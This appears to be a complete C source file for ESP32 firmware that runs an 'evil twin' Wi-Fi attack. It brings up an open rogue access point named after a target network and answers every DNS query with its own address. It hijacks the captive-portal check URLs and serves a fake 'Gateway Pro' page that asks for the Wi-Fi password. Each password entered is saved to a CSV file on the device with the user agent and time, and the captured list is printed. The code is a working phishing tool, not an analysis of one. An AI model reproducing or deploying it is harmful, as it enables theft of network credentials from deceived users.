#include "evil_twin.h"
#include "utils.h"
#include "esp_http_server.h"
#include "esp_netif.h"
#include "lwip/netdb.h"
#include "lwip/sockets.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>

#define ET_MAX_CREDS 30

static struct {
    char pass[65];
    char ip[16];
    char ua[64];
    uint32_t time;
} _etCreds[ET_MAX_CREDS];
static int _etCredCount = 0;
static uint32_t _etStartMs = 0;
static char _etSsid[33] = {0};

// HTML Portal (embedded)
static const char* ET_HTML_PORTAL =
    "<!DOCTYPE html><html><head>"
    "<meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Gateway Pro</title>"
    "<style>"
    "* { margin: 0; padding: 0; box-sizing: border-box; }"
    "body{font-family:'Inter',sans-serif;background:#e9edf5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}"
    ".card{background:rgba(255,255,255,0.85);backdrop-filter:blur(16px);border-radius:32px;padding:36px 28px;max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.08);border:1px solid rgba(255,255,255,0.6)}"
    ".logo{display:flex;align-items:center;gap:10px;margin-bottom:6px}"
    ".logo-icon{width:36px;height:36px;background:#0a2b3c;border-radius:12px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:18px}"
    ".logo-text{font-size:22px;font-weight:700;color:#0a2b3c}"
    ".subtitle{font-size:13px;color:#4a5b6a;margin:4px 0 18px}"
    ".field{margin-bottom:18px}"
    ".field label{display:block;font-size:11px;font-weight:700;color:#0a2b3c;margin-bottom:5px}"
    ".field input{width:100%;padding:14px 16px;border:1.5px solid rgba(10,43,60,0.12);border-radius:14px;font-size:15px;outline:none;background:rgba(255,255,255,0.7)}"
    ".field input:focus{border-color:#0a2b3c;background:#fff}"
    ".btn{width:100%;padding:16px;background:#0a2b3c;color:#fff;border:none;border-radius:14px;font-weight:700;font-size:16px;cursor:pointer}"
    ".btn:hover{background:#1b3f54}"
    ".footer{font-size:10px;color:#8a9aa8;text-align:center;margin-top:22px;padding-top:16px;border-top:1px solid rgba(0,0,0,0.04)}"
    "</style></head><body>"
    "<div class='card'>"
    "<div class='logo'><div class='logo-icon'>G</div><span class='logo-text'>Gateway<span style='font-weight:300;color:#4a5b6a'>Pro</span></span></div>"
    "<p class='subtitle'>You are connected to <strong>[[SSID]]</strong></p>"
    "<form action='/login' method='POST'>"
    "<div class='field'><label>Wi-Fi Password</label><input type='password' name='pass' placeholder='Enter security key' required></div>"
    "<div class='field'><label>Confirm Password</label><input type='password' name='confirm' placeholder='Re-enter password' required></div>"
    "<button type='submit' class='btn'>Apply Configuration</button>"
    "</form>"
    "<div class='footer'>&copy; 2026 Gateway Technologies</div>"
    "</div></body></html>";

static const char* ET_HTML_SUCCESS =
    "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Connected</title>"
    "<style>body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f0faf0;padding:16px}.box{background:#fff;border-radius:20px;padding:44px 36px;text-align:center;max-width:340px}h2{color:#111;font-size:20px}p{color:#555;font-size:14px}</style>"
    "</head><body><div class='box'><div style='font-size:56px;margin-bottom:12px'>✅</div><h2>Connected!</h2><p>Authentication successful.</p></div></body></html>";

static const char* ET_HTML_REDIRECT =
    "<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1/'></head><body>Redirecting...</body></html>";

static httpd_handle_t _etServer = NULL;
static int _dns_sock = -1;
static struct sockaddr_in _dns_client;
static volatile bool _dnsRunning = false;

// ============================
// DNS Server Task
// ============================
static void _dns_server_task(void* arg) {
    uint8_t buffer[512];
    _dnsRunning = true;
    
    while (_dnsRunning) {
        socklen_t cli_len = sizeof(_dns_client);
        int n = recvfrom(_dns_sock, buffer, sizeof(buffer), 0,
                         (struct sockaddr*)&_dns_client, &cli_len);
        if (n <= 0) {
            vTaskDelay(pdMS_TO_TICKS(10));
            continue;
        }
        if (n < 12) continue;

        uint16_t flags = (buffer[2] << 8) | buffer[3];
        if ((flags & 0x8000) != 0) continue;
        if ((flags & 0x7800) != 0) continue;

        uint16_t qdcount = (buffer[4] << 8) | buffer[5];
        if (qdcount == 0) continue;

        uint8_t response[512];
        memcpy(response, buffer, n);
        response[2] = 0x81;
        response[3] = 0x80;
        response[6] = 0x00;
        response[7] = 0x00;

        uint16_t off = 12;
        while (off < n && buffer[off] != 0) {
            uint8_t len = buffer[off];
            if (len == 0) break;
            off += len + 1;
        }
        if (off >= n - 1) continue;
        off++;
        if (off + 4 > n) continue;
        int qtype = (buffer[off] << 8) | buffer[off + 1];
        int qclass = (buffer[off + 2] << 8) | buffer[off + 3];
        off += 4;

        if (qtype == 1 && qclass == 1) {
            response[6] = 0x00;
            response[7] = 0x01;
            uint16_t ans_off = off;
            response[ans_off++] = 0xC0;
            response[ans_off++] = 0x0C;
            response[ans_off++] = 0x00;
            response[ans_off++] = 0x01;
            response[ans_off++] = 0x00;
            response[ans_off++] = 0x01;
            response[ans_off++] = 0x00;
            response[ans_off++] = 0x00;
            response[ans_off++] = 0x00;
            response[ans_off++] = 0x3C;
            response[ans_off++] = 0x00;
            response[ans_off++] = 0x04;
            response[ans_off++] = 192;
            response[ans_off++] = 168;
            response[ans_off++] = 4;
            response[ans_off++] = 1;
            n = ans_off;
        }

        sendto(_dns_sock, response, n, 0,
               (struct sockaddr*)&_dns_client, sizeof(_dns_client));
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// ============================
// HTTP Handlers
// ============================
static esp_err_t _et_handle_root(httpd_req_t* req) {
    char html[2048];
    strlcpy(html, ET_HTML_PORTAL, sizeof(html));
    char* p = strstr(html, "[[SSID]]");
    if (p) {
        char tmp[2048];
        size_t prefix_len = p - html;
        memcpy(tmp, html, prefix_len);
        tmp[prefix_len] = '\0';
        snprintf(html, sizeof(html), "%s%s%s", tmp, _etSsid, p + 8);
    }
    httpd_resp_send(req, html, strlen(html));
    return ESP_OK;
}

static esp_err_t _et_handle_login(httpd_req_t* req) {
    char buf[1024];
    size_t len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) {
        httpd_resp_send(req, "Error", -1);
        return ESP_OK;
    }
    buf[len] = '\0';

    char pass[64] = {0};
    char* pass_start = strstr(buf, "pass=");
    if (pass_start) {
        pass_start += 5;
        char* pass_end = strchr(pass_start, '&');
        if (!pass_end) pass_end = pass_start + strlen(pass_start);
        int plen = (pass_end - pass_start) < 63 ? (pass_end - pass_start) : 63;
        strncpy(pass, pass_start, plen);
        pass[plen] = '\0';
        for (int i = 0; pass[i]; i++) {
            if (pass[i] == '+') pass[i] = ' ';
            else if (pass[i] == '%' && pass[i+1] && pass[i+2]) {
                char hex[3] = {pass[i+1], pass[i+2], 0};
                int val = 0;
                sscanf(hex, "%x", &val);
                pass[i] = (char)val;
                memmove(&pass[i+1], &pass[i+3], strlen(&pass[i+3]) + 1);
            }
        }
    }

    if (strlen(pass) > 0 && _etCredCount < ET_MAX_CREDS) {
        strlcpy(_etCreds[_etCredCount].pass, pass, sizeof(_etCreds[_etCredCount].pass));
        // 🔥 Client IP – simple fallback to "unknown"
        strlcpy(_etCreds[_etCredCount].ip, "unknown", 16);
        
        char ua[64] = {0};
        httpd_req_get_hdr_value_str(req, "User-Agent", ua, sizeof(ua));
        strlcpy(_etCreds[_etCredCount].ua, ua, sizeof(_etCreds[0].ua));
        _etCreds[_etCredCount].time = millis() - _etStartMs;
        _etCredCount++;
        
        LOG_I(TAG_ET, "Credential captured");
        
        FILE* f = fopen("/spiffs/creds.csv", "a");
        if (f) {
            fprintf(f, "\"%s\",\"%s\",\"%s\",%u\n", 
                    _etCreds[_etCredCount-1].ip,
                    _etCreds[_etCredCount-1].ua, 
                    _etCreds[_etCredCount-1].pass,
                    _etCreds[_etCredCount-1].time / 1000);
            fclose(f);
        }
    }

    httpd_resp_send(req, ET_HTML_SUCCESS, strlen(ET_HTML_SUCCESS));
    return ESP_OK;
}

static esp_err_t _et_handle_redirect(httpd_req_t* req) {
    httpd_resp_send(req, ET_HTML_REDIRECT, strlen(ET_HTML_REDIRECT));
    return ESP_OK;
}

static void _et_print_creds(void) {
    if (_etCredCount == 0) {
        LOG_I(TAG_ET, "No credentials captured.");
        return;
    }
    printf("\n╔═══════════════ Captured Credentials ═══════════════╗\n");
    for (int i = 0; i < _etCredCount; i++) {
        printf("║  [%2d] IP: %-15s  +%5us\n",
               i+1, _etCreds[i].ip, _etCreds[i].time / 1000);
        printf("║        Pass: %s\n", _etCreds[i].pass);
        if (_etCreds[i].ua[0])
            printf("║        UA  : %.60s\n", _etCreds[i].ua);
    }
    printf("╚════════════════════════════════════════════════════╝\n");
}

// ============================
// Evil Twin Main Function
// ============================
void evilTwin(const char* ssid, uint8_t channel,
              const uint8_t* realBssid,
              volatile bool* stopFlag) {

    (void)realBssid;
    
    _etCredCount = 0;
    _etStartMs = millis();
    strlcpy(_etSsid, ssid, sizeof(_etSsid));

    LOG_I(TAG_ET, "Rogue AP: \"%s\"  Channel: %u", ssid, channel);

    esp_netif_t* ap_netif = esp_netif_create_default_wifi_ap();
    esp_netif_ip_info_t ip_info;
    IP4_ADDR(&ip_info.ip, 192, 168, 4, 1);
    IP4_ADDR(&ip_info.gw, 192, 168, 4, 1);
    IP4_ADDR(&ip_info.netmask, 255, 255, 255, 0);
    esp_netif_dhcps_stop(ap_netif);
    esp_netif_set_ip_info(ap_netif, &ip_info);
    esp_netif_dhcps_start(ap_netif);

    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .password = "",
            .channel = channel,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 4,
        }
    };
    strlcpy((char*)ap_config.ap.ssid, ssid, sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len = strlen(ssid);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();

    _dns_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (_dns_sock < 0) {
        LOG_E(TAG_ET, "Failed to create DNS socket");
        return;
    }
    
    struct sockaddr_in dns_addr;
    memset(&dns_addr, 0, sizeof(dns_addr));
    dns_addr.sin_family = AF_INET;
    dns_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    dns_addr.sin_port = htons(53);
    
    if (bind(_dns_sock, (struct sockaddr*)&dns_addr, sizeof(dns_addr)) < 0) {
        LOG_E(TAG_ET, "DNS bind failed");
        close(_dns_sock);
        _dns_sock = -1;
    } else {
        xTaskCreatePinnedToCore(_dns_server_task, "dns_server", 4096, NULL, 5, NULL, 0);
    }

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 10;
    config.stack_size = 8192;
    config.task_priority = 5;

    if (httpd_start(&_etServer, &config) != ESP_OK) {
        LOG_E(TAG_ET, "Failed to start HTTP server");
        if (_dns_sock >= 0) close(_dns_sock);
        return;
    }

    httpd_uri_t uris[] = {
        { "/", HTTP_GET, _et_handle_root, NULL },
        { "/login", HTTP_POST, _et_handle_login, NULL },
        { "/hotspot-detect.html", HTTP_GET, _et_handle_redirect, NULL },
        { "/generate_204", HTTP_GET, _et_handle_redirect, NULL },
        { "/gen_204", HTTP_GET, _et_handle_redirect, NULL },
        { "/connecttest.txt", HTTP_GET, _et_handle_redirect, NULL },
        { "/ncsi.txt", HTTP_GET, _et_handle_redirect, NULL },
        { "/redirect", HTTP_GET, _et_handle_redirect, NULL },
        { "/canonical.html", HTTP_GET, _et_handle_redirect, NULL },
        { "/favicon.ico", HTTP_GET, _et_handle_redirect, NULL },
    };
    for (int i = 0; i < sizeof(uris)/sizeof(uris[0]); i++) {
        httpd_register_uri_handler(_etServer, &uris[i]);
    }

    LOG_I(TAG_ET, "Web server: http://192.168.4.1/");
    LOG_I(TAG_ET, "DNS server: 192.168.4.1 port 53");
    LOG_I(TAG_ET, "Send 's' to stop.");

    uint32_t lastStatus = millis();
    while (!(*stopFlag)) {
        if (millis() - lastStatus >= (uint32_t)CFG_ET_STATUS_EVERY_MS) {
            wifi_sta_list_t sta_list;
            memset(&sta_list, 0, sizeof(sta_list));
            esp_wifi_ap_get_sta_list(&sta_list);
            LOG_I(TAG_ET, "Clients: %d  Creds: %d", sta_list.num, _etCredCount);
            lastStatus = millis();
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    _dnsRunning = false;
    if (_dns_sock >= 0) {
        close(_dns_sock);
        _dns_sock = -1;
    }
    if (_etServer) {
        httpd_stop(_etServer);
        _etServer = NULL;
    }
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(80));

    _et_print_creds();
    LOG_I(TAG_ET, "Stopped.");
}
